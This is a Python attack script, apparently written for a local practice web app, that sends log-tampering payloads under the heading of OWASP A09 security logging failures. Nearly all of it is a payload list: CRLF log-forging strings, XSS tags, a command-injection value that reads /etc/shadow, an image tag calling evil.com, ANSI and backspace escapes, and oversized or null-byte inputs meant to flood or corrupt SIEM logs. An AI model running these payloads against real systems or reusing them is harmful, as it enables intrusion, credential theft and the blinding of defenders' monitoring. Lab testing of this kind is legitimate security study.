import requests, time, random, urllib.parse
TARGET = 'http://localhost:8080/'
COOKIES = {'PHPSESSID': '35cacc52bfc92dc522e7638831ba3474', 'security': 'low'}
PAYLOADS = [
    # --- Heavy 404 Logging & Error generation Spam ---
    'non_existent_page_1.php', 'admin_not_found.html', 'missing_resource.js',
    'api/v1/invalid_endpoint', 'super_secret_dir/non_existent',
    
    # --- Log Forging / CRLF Injection (%0A%0D) ---
    'index.php%0d%0a127.0.0.1%20-%20admin%20%5B%2B%5D%20"GET%20/login.php%20HTTP/1.1"%20200',
    'search.php?q=fake%0a%0d12.34.56.78%20GET%20/admin',
    'login.php%0A%0DUser-Agent:%20FakeLog',
    
    # --- Terminal/Splunk XSS & Command Injection over Logs ---
    'index.php?<script>alert("Log_XSS")</script>',
    'index.php?user=<img src=x onerror=alert(1)>',
    'index.php?cmd=`;cat /etc/shadow`', # Executed if log viewer passes to bash
    'log.php?\\x1B[31mRedText\\x1B[0m', # ANSI Escape Sequences (colors in terminal)
    'log.php?<img src=http://evil.com/logger>',
    
    # --- Overwhelming the SIEM (Buffer Bloat & Path Confusion) ---
    'A' * 2000, 
    'B' * 5000, 
    'C' * 8000, # Large payloads to truncate logs or create OutOfMemory
    '../../../..///////..////...////.......//////...............',
    '%00' * 500, # Spamming null bytes to malform JSON logs
    '\\x08' * 100 # Spamming backspaces over logs
]
print('--- A09: Security Logging Failures (Log Evasion/Spam) ---')
for p in PAYLOADS:
    url = TARGET + urllib.parse.quote(p) if 'A'*5000 not in p else TARGET + p
    res = requests.get(url, cookies=COOKIES)
    print(f'[*] Log Tampering Payload: {p[:40]}... -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
